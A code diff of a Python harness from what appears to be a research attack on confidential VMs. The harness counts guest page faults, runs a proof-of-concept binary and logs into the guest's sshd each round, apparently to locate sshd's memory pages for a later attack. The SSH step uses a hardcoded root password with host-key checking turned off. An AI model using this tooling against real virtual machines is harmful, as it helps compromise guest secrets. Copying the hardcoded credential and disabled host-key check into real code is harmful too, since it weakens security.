@@ -22,11 +22,11 @@ def normal_test():
                 counter[pf_addr] += 1
                 print(f"new pf: {pf_addr}，current count: {counter[pf_addr]}\n")
 
-def auto_pagefault_stat():
+def auto_pagefault_stat(count=10):
     import threading
     PF_PATTERN = re.compile(r'page_fault_handle_page_track:.*?pf: ([0-9a-fA-F]+)')
-    WEEPOC_CMD = ['./weepoc']
-    ROUNDS = 2
+    WEEPOC_CMD = ['./poc', 'pagefault']
+    ROUNDS = count
     NO_FAULT_TIMEOUT = 4  # seconds
 
     pf_queue = queue.Queue()  # thread-safe queue (timestamp, pf_addr)
@@ -60,31 +60,6 @@ def auto_pagefault_stat():
 
     listener = threading.Thread(target=listen_pf, args=(stop_event, pf_queue))
     commander = threading.Thread(target=command_worker, args=(cmd_event, cmd_done_event, stop_event))
-    # SSH login thread
-    def ssh_worker(stop_event):
-        import subprocess
-        import time
-        
-        for i in range(5):
-            try:
-                print("try to ssh login...")
-                # use sshpass to automatically input the password for SSH login
-                result = subprocess.run([
-                    'sshpass', '-p', 'password',  # modify the password according to the actual password
-                    'ssh', '-o', 'StrictHostKeyChecking=no',
-                    '-p', '2221',
-                    'root@127.0.0.1',  # modify the username and host according to the actual username and host
-                    'ls -la && ps aux'
-                ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=5)
-                
-                if result.returncode == 0:
-                    print("ssh login success")
-                else:
-                    print(f"ssh login failed: {result.stderr}")                
-            except Exception as e:
-                print(f"ssh login exception: {e}")
-
-    ssh_thread = threading.Thread(target=ssh_worker, args=(stop_event,))
     listener.daemon = True
     commander.daemon = True
     listener.start()
@@ -96,6 +71,26 @@ def auto_pagefault_stat():
         cmd_event.set()
         cmd_done_event.wait()  # wait for the command thread to finish
         last_pf_time = time.time()
+        
+        # Execute SSH connection in each round
+        try:
+            print("try to ssh login...")
+            # use sshpass to automatically input the password for SSH login
+            result = subprocess.run([
+                'sshpass', '-p', 'password',  # modify the password according to the actual password
+                'ssh', '-o', 'StrictHostKeyChecking=no',
+                '-p', '2221',
+                'root@127.0.0.1',  # modify the username and host according to the actual username and host
+                'ls -la && ps aux'
+            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=5)
+            
+            if result.returncode == 0:
+                print("ssh login success")
+            else:
+                print(f"ssh login failed: {result.stderr}")                
+        except Exception as e:
+            print(f"ssh login exception: {e}")
+        
         print(f"\n=== round {round_idx+1} ===")
         while True:
             try:
@@ -252,11 +247,20 @@ def attack_stat(dst_addr, offset, replace_index1, replace_index2, replace_index3
     subprocess.run(cmd)
     return 0
 
+
+def locat_page():
+    frequent_pages = auto_pagefault_stat()
+    from get_feature import get_page_md5
+    for gpa in frequent_pages:
+        gpa = "0x"+gpa
+        get_page_md5(gpa)
+
 if __name__ == '__main__':
-    bin_path = "/home/pw0rld/security-25/host_sshd"
-    page_md5s = analyze_binary_cacheline_features(bin_path)
+    # bin_path = "/home/pw0rld/security-25/CSV-CipherShadow/CipherShadow-Attack/endtoend/sshd"
+    # page_md5s = analyze_binary_cacheline_features(bin_path)
+    # print(page_md5s)
     # attack_stat("0x6333000",0x6f0,2,1,-1)
-    # frequent_pages = auto_pagefault_stat()
+
     # print(frequent_pages)
     # from get_feature import get_page_md5
     # for gpa in frequent_pages:
